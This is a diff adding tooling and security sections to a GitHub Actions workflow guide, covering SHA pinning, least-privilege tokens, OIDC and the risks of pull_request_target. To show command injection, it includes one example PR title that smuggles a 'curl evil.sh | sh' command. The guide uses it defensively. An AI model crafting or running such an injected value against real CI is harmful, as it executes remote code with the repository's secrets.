@@ -288,6 +288,57 @@ In repo settings → Environments → `production`: required reviewers, wait tim
 8. **Reusability** — duplicated steps refactored into composite actions / reusable workflows?
 9. **Failure surface** — artifacts uploaded on failure; step summaries used; clear error messages?
 
+## Tooling
+
+- **Linting**: `actionlint` on every workflow file — it catches shell quoting bugs, bad `if:` expressions, and invalid `runs-on` before a push burns a CI minute.
+- **Pinning**: Dependabot or Renovate with `pin-github-action` so third-party actions stay digest-pinned *and* updated. Pinning without an updater just means running known-vulnerable actions forever.
+- **Local runs**: `act` for fast iteration on job logic. It diverges from hosted runners on services and caching, so confirm on a real runner before merging.
+- **Secret scanning**: enable push protection and secret scanning on the repository. `zizmor` audits workflows specifically for injection and privilege mistakes.
+- **Caching**: `actions/cache` with a lockfile-hash key, or the language-native setup action's built-in cache (`setup-node --cache`). Never cache anything derived from a secret.
+- **Auth to clouds**: the provider's OIDC action (`aws-actions/configure-aws-credentials`, `google-github-actions/auth`) — no stored long-lived keys.
+- **Reusable workflows** (`workflow_call`) over copy-paste across repos; composite actions for step-level reuse.
+
+## Security
+
+A workflow is remote code execution triggered by strangers. The threat model is an attacker who opens a pull request.
+
+- **`pull_request_target` runs with secrets and write permissions against untrusted code.** If you use it, never check out the PR head, and never run a build or install script from the fork — `npm ci` alone executes attacker-controlled lifecycle scripts. Prefer `pull_request` plus a separate, manually-approved deploy workflow.
+- **Never interpolate untrusted input into `run:`.** `${{ github.event.pull_request.title }}` inside a shell step is command injection — a PR titled `"; curl evil.sh | sh; #` executes on your runner with your secrets. Pass it through `env:` and reference `"$TITLE"`, which never gets evaluated as shell.
+- **Pin third-party actions to a full commit SHA.** A tag is a mutable pointer the action's owner can repoint at any time; several supply-chain incidents have worked exactly this way.
+- **Least-privilege `GITHUB_TOKEN`.** Set `permissions: {}` at the workflow level and grant per job. The default token is often write-capable across the whole repository.
+- **OIDC instead of stored cloud keys.** Short-lived, auditable, scoped to a specific repo *and ref* — set the cloud-side trust condition on `sub`, or any repo in your org can assume the role.
+- **Secrets don't reach forks** — that's deliberate. If a workflow "needs" secrets to validate a fork PR, it needs redesigning, not an exception.
+- **Guard self-hosted runners.** Never attach them to a public repository with fork PRs enabled: a fork PR becomes arbitrary code execution on your infrastructure, with whatever network access that machine has. Use ephemeral, isolated runners.
+- **`echo "::add-mask::"` any secret you derive at runtime**, and remember masking is best-effort — base64 or split output defeats it.
+
+```yaml
+permissions: {}          # deny by default, grant per job
+
+jobs:
+  build:
+    permissions:
+      contents: read
+      id-token: write    # OIDC only
+    runs-on: ubuntu-latest
+    steps:
+      # Pin to the full commit SHA of the release you reviewed; the comment
+      # records which tag it corresponded to so updates stay legible.
+      - uses: actions/checkout@<full-40-char-sha>              # v4.2.2
+      - uses: aws-actions/configure-aws-credentials@<full-40-char-sha>  # v4.0.2
+        with:
+          role-to-assume: arn:aws:iam::111122223333:role/ci-deploy
+          aws-region: eu-west-1
+
+      # ✅ untrusted input via env — never evaluated as shell
+      - name: Label the PR
+        env:
+          TITLE: ${{ github.event.pull_request.title }}
+        run: printf '%s\n' "$TITLE" | grep -q '^feat:' && echo "feature=true" >> "$GITHUB_OUTPUT"
+
+      # ❌ never do this — a crafted PR title runs as a command
+      # run: echo "${{ github.event.pull_request.title }}"
+```
+
 ## What to avoid
 
 - `actions/checkout@v4` (a tag) for third-party actions in production workflows. Tag pinning is fine for first-party (`actions/*`, `github/*`) only because GitHub itself controls those.
